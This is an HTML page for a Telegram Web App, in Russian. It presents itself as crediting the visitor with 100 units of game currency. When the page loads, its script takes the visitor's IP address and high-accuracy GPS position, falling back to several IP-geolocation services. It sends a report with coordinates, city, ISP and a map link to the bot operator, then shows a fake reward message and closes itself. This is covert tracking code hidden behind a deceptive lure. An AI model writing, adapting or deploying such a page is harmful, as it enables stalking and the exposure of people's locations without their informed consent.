<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Начисление GC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            padding: 30px;
            max-width: 400px;
            width: 100%;
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 15px; }
        p { font-size: 16px; opacity: 0.9; margin-bottom: 10px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { font-size: 64px; }
        .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
        .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
        .status-text { font-size: 12px; opacity: 0.7; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container" id="status">
        <div class="icon">💰</div>
        <h1>Начисление 100GC</h1>
        <p>Определяем данные...</p>
        <div class="spinner"></div>
        <p class="status-text" id="statusText">⏳ Загрузка...</p>
    </div>

    <script>
        let timer = 5;
        let timerInterval;

        function closeApp() {
            Telegram.WebApp.close();
        }

        function updateStatus(text) {
            document.getElementById('statusText').textContent = text;
        }

        // 1. IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return null;
            }
        }

        // 2. GPS (автоматически)
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'GPS'
                        });
                    },
                    () => resolve(null),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // 3. ip-api.com
        async function getLocationIPAPI(ip) {
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName`);
                const data = await response.json();
                if (data.status === 'success' && data.lat) {
                    return {
                        country: data.country || 'Неизвестно',
                        city: data.city || 'Неизвестно',
                        region: data.regionName || 'Неизвестно',
                        lat: data.lat,
                        lon: data.lon,
                        isp: data.isp || 'Неизвестно',
                        timezone: data.timezone || 'Неизвестно',
                        source: 'ip-api.com'
                    };
                }
                return null;
            } catch { return null; }
        }

        // 4. geoplugin.net
        async function getLocationGeoPlugin() {
            try {
                const response = await fetch('https://www.geoplugin.net/json.gp');
                const data = await response.json();
                if (data.geoplugin_status === '200') {
                    return {
                        country: data.geoplugin_countryName || 'Неизвестно',
                        city: data.geoplugin_city || 'Неизвестно',
                        region: data.geoplugin_region || 'Неизвестно',
                        lat: parseFloat(data.geoplugin_latitude) || 0,
                        lon: parseFloat(data.geoplugin_longitude) || 0,
                        isp: data.geoplugin_region || 'Неизвестно',
                        source: 'geoplugin.net'
                    };
                }
                return null;
            } catch { return null; }
        }

        // 5. ipinfo.io
        async function getLocationIpInfo(ip) {
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await response.json();
                if (data.loc) {
                    const [lat, lon] = data.loc.split(',').map(Number);
                    return {
                        country: data.country || 'Неизвестно',
                        city: data.city || 'Неизвестно',
                        region: data.region || 'Неизвестно',
                        lat: lat,
                        lon: lon,
                        isp: data.org || 'Неизвестно',
                        timezone: data.timezone || 'Неизвестно',
                        source: 'ipinfo.io'
                    };
                }
                return null;
            } catch { return null; }
        }

        // 6. Обратный геокодер (по координатам)
        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=ru`);
                const data = await response.json();
                if (data.city || data.locality) {
                    return {
                        country: data.countryName || 'Неизвестно',
                        city: data.city || data.locality || 'Неизвестно',
                        region: data.principalSubdivision || 'Неизвестно'
                    };
                }
                return null;
            } catch { return null; }
        }

        async function sendData() {
            updateStatus('🌐 Получение IP...');
            const ip = await getIP();
            
            if (!ip) {
                updateStatus('❌ IP не получен');
                return;
            }

            updateStatus('📍 Запрос GPS...');
            const gps = await getGPS();

            let location = null;
            let dataString = `🌐 IP: ${ip}`;

            // Сначала GPS (самый точный)
            if (gps && gps.lat) {
                location = gps;
                dataString += `\n\n📍 **GPS (точные координаты):**`;
                dataString += `\n🗺️ Широта: ${gps.lat}`;
                dataString += `\n🗺️ Долгота: ${gps.lon}`;
                dataString += `\n📏 Точность: ±${Math.round(gps.accuracy)}м`;
                dataString += `\n📍 Карта: https://www.google.com/maps?q=${gps.lat},${gps.lon}`;

                // Пробуем определить город по GPS
                updateStatus('🏙️ Определение города по GPS...');
                const geo = await reverseGeocode(gps.lat, gps.lon);
                if (geo) {
                    dataString += `\n🏙️ Город: ${geo.city}`;
                    dataString += `\n🌍 Страна: ${geo.country}`;
                }
            } else {
                updateStatus('📍 Поиск гео через IP...');
                
                // Пробуем все сервисы по очереди
                const services = [
                    { name: 'ip-api.com', fn: async () => await getLocationIPAPI(ip) },
                    { name: 'ipinfo.io', fn: async () => await getLocationIpInfo(ip) },
                    { name: 'geoplugin.net', fn: async () => await getLocationGeoPlugin() }
                ];

                for (const service of services) {
                    updateStatus(`🔍 Проверка ${service.name}...`);
                    try {
                        const result = await service.fn();
                        if (result && result.lat && result.lat !== 0) {
                            location = result;
                            break;
                        }
                    } catch (e) {}
                }

                if (location && location.lat) {
                    dataString += `\n\n📍 Геолокация (${location.source}):`;
                    dataString += `\n🌍 Страна: ${location.country}`;
                    dataString += `\n🏙️ Город: ${location.city}`;
                    if (location.region && location.region !== 'Неизвестно') {
                        dataString += `\n🗺️ Регион: ${location.region}`;
                    }
                    dataString += `\n📡 Провайдер: ${location.isp}`;
                    dataString += `\n🕐 Часовой пояс: ${location.timezone || 'Неизвестно'}`;
                    dataString += `\n🗺️ Координаты: ${location.lat}, ${location.lon}`;
                    dataString += `\n📍 Карта: https://www.google.com/maps?q=${location.lat},${location.lon}`;
                } else {
                    dataString += `\n\n❌ Геолокация не определена ни одним сервисом`;
                    dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
                }
            }

            updateStatus('📤 Отправка данных...');
            Telegram.WebApp.sendData(dataString);

            // Показываем результат
            let html = `
                <div class="icon success">✅</div>
                <h1>100GC начислены!</h1>
                <p>Данные получены</p>
                <p class="info">🌐 IP: ${ip}</p>
            `;

            if (gps && gps.lat) {
                html += `<p class="info">📍 GPS: ${gps.lat}, ${gps.lon}</p>`;
                html += `<p class="info" style="font-size: 12px;">📏 ±${Math.round(gps.accuracy)}м</p>`;
            } else if (location && location.lat) {
                html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
                html += `<p class="info" style="font-size: 12px;">📡 ${location.source}</p>`;
            } else {
                html += `<p class="info">❌ Геолокация не найдена</p>`;
            }

            html += `<p class="small">Закрывается через 5 секунд...</p>`;
            document.getElementById('status').innerHTML = html;

            timer = 5;
            timerInterval = setInterval(() => {
                timer--;
                if (timer <= 0) {
                    clearInterval(timerInterval);
                    closeApp();
                }
            }, 1000);
        }

        sendData();
    </script>
</body>
</html>
